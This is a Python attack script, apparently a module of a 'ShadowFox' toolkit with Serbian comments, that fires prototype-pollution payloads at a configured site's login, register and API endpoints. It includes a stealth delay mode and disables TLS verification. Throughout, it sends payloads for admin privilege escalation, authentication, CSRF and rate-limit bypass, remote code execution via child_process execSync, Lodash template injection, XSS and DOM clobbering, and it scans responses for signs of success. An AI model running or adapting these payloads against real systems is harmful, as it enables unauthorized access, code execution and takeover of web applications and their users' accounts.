
#!/usr/bin/env python3
"""
🦊 SHADOWFOX PROTOTYPE POLLUTION ESCALATION MODULE
Specijalizovani modul za duboko exploitation prototype pollution ranjivosti
Autor: Whitefox980 | Verzija: 2025.06.06
"""

import requests
import json
import time
import random
import hashlib
from urllib.parse import urljoin, urlparse
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class PrototypePollutionEscalator:
    def __init__(self):
        self.session = requests.Session()
        self.meta_config = {}
        self.target_url = ""
        self.escalation_results = {
            "mission_info": {},
            "confirmed_pollution": [],
            "rce_attempts": [],
            "auth_bypass_attempts": [],
            "dom_clobbering_attempts": [],
            "ast_injection_attempts": [],
            "library_pollution_attempts": [],
            "middleware_bypass_attempts": [],
            "critical_findings": [],
            "statistics": {}
        }
        
    def load_meta_config(self):
        """Učitava Meta konfiguraciju"""
        try:
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
                self.target_url = self.meta_config.get('target_root', '')
                if not self.target_url.startswith("http"):
                    print("❌ [ERROR] target_root nije validan URL!")
                    exit(1)

                self.escalation_results["mission_info"] = self.meta_config
                print(f"🧠 [META] Target: {self.target_url}")
        except FileNotFoundError:
            print("❌ [ERROR] Meta/mission_info.json nije pronađen!")
            exit(1)
            
    def setup_session(self):
        """Konfiguracija sesije"""
        headers = self.meta_config.get('default_headers', {})
        self.session.headers.update(headers)
        self.session.headers['Content-Type'] = 'application/json'
        self.session.verify = False
        self.session.timeout = 15
        
    def intelligent_delay(self):
        """Pametno kašnjenje"""
        if self.meta_config.get('stealth_mode', False):
            delay = self.meta_config.get('rate_delay_seconds', 2.5)
            time.sleep(delay + random.uniform(0, 1))
        else:
            time.sleep(random.uniform(0.5, 1.5))

    def test_basic_pollution(self, endpoint):
        """Test osnovne prototype pollution ranjivosti"""
        print(f"🧪 [BASIC TEST] Testing basic pollution: {endpoint}")
        
        basic_payloads = [
            # Admin privilege escalation
            {"__proto__": {"admin": True}},
            {"__proto__": {"isAdmin": True}},
            {"__proto__": {"role": "admin"}},
            {"__proto__": {"privileged": True}},
            {"__proto__": {"authorized": True}},
            
            # Authentication bypass
            {"__proto__": {"authenticated": True}},
            {"__proto__": {"loggedIn": True}},
            {"__proto__": {"isAuthenticated": True}},
            {"__proto__": {"user": {"role": "admin"}}},
            
            # Common application logic bypass
            {"__proto__": {"isValidated": True}},
            {"__proto__": {"verified": True}},
            {"__proto__": {"approved": True}},
            {"__proto__": {"enabled": True}},
            {"__proto__": {"active": True}}
        ]
        
        for payload in basic_payloads:
            try:
                self.intelligent_delay()
                full_url = urljoin(self.target_url, endpoint)
                response = self.session.post(full_url, json=payload)
                print(f"🔄 Sent payload to: {full_url} | Status: {response.status_code}")
                result = {
                    "payload": payload,
                    "endpoint": endpoint,
                    "status_code": response.status_code,
                    "response_length": len(response.text),
                    "response_headers": dict(response.headers),
                    "success_indicators": []
                }
                
                # Analiza success indikatora
                if response.status_code in [200, 201, 302]:
                    result["success_indicators"].append("HTTP_SUCCESS")
                    
                if "admin" in response.text.lower():
                    result["success_indicators"].append("ADMIN_REFERENCE")
                    
                if "dashboard" in response.text.lower():
                    result["success_indicators"].append("DASHBOARD_ACCESS")
                    
                if "unauthorized" not in response.text.lower():
                    result["success_indicators"].append("NO_UNAUTHORIZED_ERROR")
                    
                if result["success_indicators"]:
                    self.escalation_results["confirmed_pollution"].append(result)
                    print(f"🎯 [POLLUTION CONFIRMED] {payload} - {result['success_indicators']}")
                    
            except Exception as e:
                print(f"❌ [BASIC TEST ERROR] {str(e)}")

    def test_rce_escalation(self, endpoint):
        """Test Remote Code Execution escalation"""
        print(f"💥 [RCE TEST] Testing RCE escalation: {endpoint}")
        
        rce_payloads = [
            # Node.js RCE via child_process pollution
            {"__proto__": {"shell": "/bin/bash", "env": {"NODE_OPTIONS": "--inspect"}}},
            {"__proto__": {"execPath": "/bin/sh"}},
            {"__proto__": {"NODE_OPTIONS": "--require ./malicious.js"}},
            
            # Express.js middleware pollution
            {"__proto__": {"query": {"constructor": {"prototype": {"isAdmin": True}}}}},
            {"__proto__": {"body": {"constructor": {"prototype": {"rce": "require('child_process').exec('id')"}}}}},
            
            # Template engine pollution (Handlebars, Mustache, etc.)
            {"__proto__": {"template": "{{#with (lookup . '__proto__')}}{{lookup . 'constructor'}}{{/with}}"}},
            {"__proto__": {"layout": False, "defaultLayout": False}},
            
            # JSON.stringify pollution
            {"__proto__": {"toJSON": {"constructor": {"prototype": {"toString": "function(){return require('child_process').execSync('whoami').toString()}"}}}}},
            
            # Lodash template pollution
            {"__proto__": {"sourceURL": "\\u000areturn global.process.mainModule.constructor._load('child_process').execSync('id');//"}},
            
            # AST Injection via parser pollution
            {"__proto__": {"type": "Program", "body": [{"type": "ExpressionStatement", "expression": {"type": "CallExpression"}}]}},
            
            # VM context escape
            {"__proto__": {"constructor": {"constructor": "return process"}}},
            {"__proto__": {"valueOf": "function(){return global.process.mainModule.require('child_process').execSync('id').toString()}"}}
        ]
        
        for payload in rce_payloads:
            try:
                self.intelligent_delay()
                response = self.session.post(endpoint, json=payload)
                
                result = {
                    "attack_type": "RCE_ESCALATION",
                    "payload": payload,
                    "endpoint": endpoint,
                    "status_code": response.status_code,
                    "response_text": response.text[:1000],  # Prvi 1000 karaktera
                    "rce_indicators": []
                }
                
                # RCE detection patterns
                rce_patterns = [
                    ("uid=", "UNIX_USER_ID"),
                    ("gid=", "UNIX_GROUP_ID"), 
                    ("root", "ROOT_USER"),
                    ("bin/", "SYSTEM_PATH"),
                    ("node", "NODE_PROCESS"),
                    ("Error: Cannot find module", "MODULE_ERROR"),
                    ("SyntaxError", "SYNTAX_ERROR"),
                    ("ReferenceError", "REFERENCE_ERROR"),
                    ("child_process", "CHILD_PROCESS_REF")
                ]
                
                response_lower = response.text.lower()
                for pattern, indicator in rce_patterns:
                    if pattern.lower() in response_lower:
                        result["rce_indicators"].append(indicator)
                        
                if result["rce_indicators"]:
                    self.escalation_results["rce_attempts"].append(result)
                    self.escalation_results["critical_findings"].append(result)
                    print(f"🔥 [RCE DETECTED] {result['rce_indicators']}")
                    
            except Exception as e:
                print(f"❌ [RCE TEST ERROR] {str(e)}")

    def test_dom_clobbering(self, endpoint):
        """Test DOM Clobbering attacks"""
        print(f"🌐 [DOM CLOBBER] Testing DOM clobbering: {endpoint}")
        
        dom_payloads = [
            # HTML element pollution
            {"__proto__": {"tagName": "img", "src": "x", "onerror": "alert('XSS')"}},
            {"__proto__": {"innerHTML": "<img src=x onerror=alert('DOM')>"}},
            {"__proto__": {"outerHTML": "<script>alert('Clobbered')</script>"}},
            
            # Form element pollution
            {"__proto__": {"form": {"action": "javascript:alert('Form')", "method": "GET"}}},
            {"__proto__": {"input": {"value": "javascript:alert('Input')", "type": "text"}}},
            
            # Window object pollution
            {"__proto__": {"location": {"href": "javascript:alert('Location')"}}},
            {"__proto__": {"document": {"domain": "attacker.com"}}},
            
            # Event handler pollution
            {"__proto__": {"onclick": "alert('Click')", "onload": "alert('Load')"}},
            {"__proto__": {"addEventListener": "function(){alert('Event')}"}},
            
            # CSS pollution
            {"__proto__": {"style": {"position": "fixed", "top": "0", "left": "0", "zIndex": "9999"}}},
            {"__proto__": {"className": "admin-panel visible"}}
        ]
        
        for payload in dom_payloads:
            try:
                self.intelligent_delay()
                response = self.session.post(endpoint, json=payload)
                
                result = {
                    "attack_type": "DOM_CLOBBERING",
                    "payload": payload,
                    "status_code": response.status_code,
                    "dom_indicators": []
                }
                
                # DOM clobbering detection
                dom_patterns = [
                    ("<script", "SCRIPT_INJECTION"),
                    ("javascript:", "JAVASCRIPT_URI"),
                    ("onerror=", "ONERROR_HANDLER"),
                    ("onclick=", "ONCLICK_HANDLER"),
                    ("alert(", "ALERT_FUNCTION"),
                    ("innerHTML", "INNERHTML_REF"),
                    ("document.", "DOCUMENT_REF")
                ]
                
                for pattern, indicator in dom_patterns:
                    if pattern in response.text:
                        result["dom_indicators"].append(indicator)
                        
                if result["dom_indicators"]:
                    self.escalation_results["dom_clobbering_attempts"].append(result)
                    print(f"🌐 [DOM CLOBBER DETECTED] {result['dom_indicators']}")
                    
            except Exception as e:
                print(f"❌ [DOM CLOBBER ERROR] {str(e)}")

    def test_library_pollution(self, endpoint):
        """Test library-specific pollution (Lodash, Underscore, etc.)"""
        print(f"📚 [LIBRARY] Testing library pollution: {endpoint}")
        
        library_payloads = [
            # Lodash pollution
            {"__proto__": {"sourceURL": "\\u000areturn process\\u000a"}},
            {"__proto__": {"variable": "global", "imports": "require('child_process').exec('id')"}},
            
            # Underscore.js pollution
            {"__proto__": {"_": {"template": {"variable": "obj", "source": "return process"}}}},
            
            # Moment.js pollution
            {"__proto__": {"_f": "YYYY-MM-DD[<script>alert('moment')</script>]"}},
            {"__proto__": {"_locale": {"_config": {"longDateFormat": {"LT": "<script>alert('time')</script>"}}}}},
            
            # jQuery pollution
            {"__proto__": {"jquery": "3.0.0", "constructor": {"prototype": {"html": "function(){return '<script>alert(1)</script>'}"}}}},
            
            # Express.js pollution
            {"__proto__": {"query": {"constructor": {"prototype": {"admin": True}}}}},
            {"__proto__": {"body": {"constructor": {"prototype": {"isAuthenticated": True}}}}},
            
            # Mongoose pollution (MongoDB)
            {"__proto__": {"$where": "function(){return true}"}},
            {"__proto__": {"$regex": ".*", "$options": "i"}},
            
            # Sequelize pollution
            {"__proto__": {"where": {"$or": [{"admin": True}]}}},
            {"__proto__": {"include": {"model": "User", "where": {"role": "admin"}}}},
            
            # Handlebars pollution
            {"__proto__": {"compile": "function(){return function(){return '<script>alert(1)</script>'}}"}},
            {"__proto__": {"SafeString": "function(str){return str}"}},
            
            # Axios pollution  
            {"__proto__": {"defaults": {"transformRequest": "function(data){console.log('intercepted'); return data}"}}},
            {"__proto__": {"interceptors": {"request": {"use": "function(){return Promise.resolve()}"}}}},
        ]
        
        for payload in library_payloads:
            try:
                self.intelligent_delay()
                response = self.session.post(endpoint, json=payload)
                
                result = {
                    "attack_type": "LIBRARY_POLLUTION",
                    "payload": payload,
                    "status_code": response.status_code,
                    "library_indicators": []
                }
                
                # Library-specific detection
                lib_patterns = [
                    ("lodash", "LODASH_REF"),
                    ("underscore", "UNDERSCORE_REF"),
                    ("moment", "MOMENT_REF"),
                    ("jquery", "JQUERY_REF"),
                    ("handlebars", "HANDLEBARS_REF"),
                    ("mongoose", "MONGOOSE_REF"),
                    ("sequelize", "SEQUELIZE_REF"),
                    ("axios", "AXIOS_REF"),
                    ("template", "TEMPLATE_ENGINE"),
                    ("compile", "COMPILER_REF")
                ]
                
                response_lower = response.text.lower()
                for pattern, indicator in lib_patterns:
                    if pattern in response_lower:
                        result["library_indicators"].append(indicator)
                        
                if result["library_indicators"] or response.status_code == 500:
                    self.escalation_results["library_pollution_attempts"].append(result)
                    print(f"📚 [LIBRARY POLLUTION] {result['library_indicators']}")
                    
            except Exception as e:
                print(f"❌ [LIBRARY ERROR] {str(e)}")

    def test_middleware_bypass(self, endpoint):
        """Test Express.js middleware bypass"""
        print(f"🛡️  [MIDDLEWARE] Testing middleware bypass: {endpoint}")
        
        middleware_payloads = [
            # Express.js req/res pollution
            {"__proto__": {"method": "GET", "url": "/admin", "headers": {"authorization": "Bearer admin"}}},
            {"__proto__": {"user": {"id": 1, "role": "admin", "isAdmin": True}}},
            {"__proto__": {"session": {"authenticated": True, "user": {"role": "admin"}}}},
            
            # CSRF protection bypass
            {"__proto__": {"_csrf": "valid-token"}},
            {"__proto__": {"csrfToken": "bypass"}},
            {"__proto__": {"headers": {"x-csrf-token": "valid"}}},
            
            # Rate limiting bypass
            {"__proto__": {"rateLimit": {"reset": 9999999999, "remaining": 9999}}},
            {"__proto__": {"ip": "127.0.0.1", "ips": ["127.0.0.1"]}},
            
            # Authentication middleware bypass
            {"__proto__": {"isAuthenticated": "function(){return true}"}},
            {"__proto__": {"passport": {"user": {"id": 1, "role": "admin"}}}},
            
            # Authorization bypass
            {"__proto__": {"can": "function(){return true}"}},
            {"__proto__": {"permissions": ["admin", "read", "write", "delete"]}},
            
            # Body parser pollution
            {"__proto__": {"body": {"admin": True, "role": "superuser"}}},
            {"__proto__": {"query": {"admin": "true", "bypass": "1"}}}
        ]
        
        for payload in middleware_payloads:
            try:
                self.intelligent_delay()
                response = self.session.post(endpoint, json=payload)
                
                result = {
                    "attack_type": "MIDDLEWARE_BYPASS",
                    "payload": payload,
                    "status_code": response.status_code,
                    "bypass_indicators": []
                }
                
                # Middleware bypass detection
                bypass_patterns = [
                    ("admin", "ADMIN_ACCESS"),
                    ("dashboard", "DASHBOARD_ACCESS"),
                    ("unauthorized", "NO_UNAUTHORIZED"),
                    ("forbidden", "NO_FORBIDDEN"),
                    ("csrf", "CSRF_REF"),
                    ("session", "SESSION_REF"),
                    ("passport", "PASSPORT_REF"),
                    ("authenticated", "AUTH_REF")
                ]
                
                response_lower = response.text.lower()
                for pattern, indicator in bypass_patterns:
                    if pattern in response_lower:
                        result["bypass_indicators"].append(indicator)
                        
                # Status code analysis
                if response.status_code == 200 and "error" not in response_lower:
                    result["bypass_indicators"].append("SUCCESS_RESPONSE")
                elif response.status_code == 302:
                    result["bypass_indicators"].append("REDIRECT_RESPONSE")
                    
                if result["bypass_indicators"]:
                    self.escalation_results["middleware_bypass_attempts"].append(result)
                    print(f"🛡️  [MIDDLEWARE BYPASS] {result['bypass_indicators']}")
                    
            except Exception as e:
                print(f"❌ [MIDDLEWARE ERROR] {str(e)}")

    def run_escalation(self):
        """Pokretanje kompletne prototype pollution eskalacije"""
        print("🦊 SHADOWFOX PROTOTYPE POLLUTION ESCALATION")
        print("=" * 60)
        
        # Kreiranje liste endpoint-a za testiranje
        test_endpoints = [
            f"{self.target_url}/login",
            f"{self.target_url}/api/login", 
            f"{self.target_url}/auth/login",
            f"{self.target_url}/api/auth",
            f"{self.target_url}/api/user",
            f"{self.target_url}/api/admin",
            f"{self.target_url}/register",
            f"{self.target_url}/api/register"
        ]
        
        for endpoint in test_endpoints:
            print(f"\n🎯 [TARGET] Testing: {endpoint}")
            
            # 1. Basic pollution test
            self.test_basic_pollution(endpoint)
            
            # 2. RCE escalation  
            self.test_rce_escalation(endpoint)
            
            # 3. DOM clobbering
            self.test_dom_clobbering(endpoint)
            
            # 4. Library pollution
            self.test_library_pollution(endpoint)
            
            # 5. Middleware bypass
            self.test_middleware_bypass(endpoint)
            
        # Generisanje statistike
        self.generate_statistics()
        
    def generate_statistics(self):
        """Generisanje statistike eskalacije"""
        stats = {
            "confirmed_pollution_count": len(self.escalation_results["confirmed_pollution"]),
            "rce_attempts_count": len(self.escalation_results["rce_attempts"]),
            "dom_clobbering_count": len(self.escalation_results["dom_clobbering_attempts"]),
            "library_pollution_count": len(self.escalation_results["library_pollution_attempts"]),
            "middleware_bypass_count": len(self.escalation_results["middleware_bypass_attempts"]),
            "critical_findings_count": len(self.escalation_results["critical_findings"]),
            "scan_timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        self.escalation_results["statistics"] = stats
        
    def save_results(self):
        """Snimanje rezultata"""
        output_file = "AdvanceNapad/prototype_pollution_results.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.escalation_results, f, indent=2, ensure_ascii=False)
            print(f"\n💾 [SAVE] Rezultati snimljeni: {output_file}")
        except Exception as e:
            print(f"❌ [SAVE ERROR] {str(e)}")
            
    def display_summary(self):
        """Prikaz sažetka eskalacije"""
        stats = self.escalation_results["statistics"]
        print(f"\n🎯 PROTOTYPE POLLUTION ESCALATION - SAŽETAK")
        print("=" * 60)
        print(f"🔥 Potvrđene pollution ranjivosti: {stats['confirmed_pollution_count']}")
        print(f"💥 RCE pokušaji: {stats['rce_attempts_count']}")
        print(f"🌐 DOM clobbering: {stats['dom_clobbering_count']}")
        print(f"📚 Library pollution: {stats['library_pollution_count']}")
        print(f"🛡️  Middleware bypass: {stats['middleware_bypass_count']}")
        print(f"🚨 KRITIČNI NALAZI: {stats['critical_findings_count']}")
        
        if self.escalation_results["critical_findings"]:
            print(f"\n🔥 TOP KRITIČNI NALAZI:")
            for i, finding in enumerate(self.escalation_results["critical_findings"][:3], 1):
                attack_type = finding.get("attack_type", "UNKNOWN")
                indicators = finding.get("rce_indicators", [])
                print(f"   {i}. {attack_type}: {indicators}")
                
        print(f"\n✅ Detaljan izveštaj: AdvanceNapad/prototype_pollution_results.json")
        
    def run(self):
        """Glavna funkcija"""
        print("🦊 SHADOWFOX PROTOTYPE POLLUTION ESCALATOR - INICIJALIZACIJA")
        
        self.load_meta_config()
        self.setup_session()
        self.run_escalation()
        self.save_results()
        self.display_summary()

def main():
    escalator = PrototypePollutionEscalator()
    escalator.run()

if __name__ == "__main__":
    main()

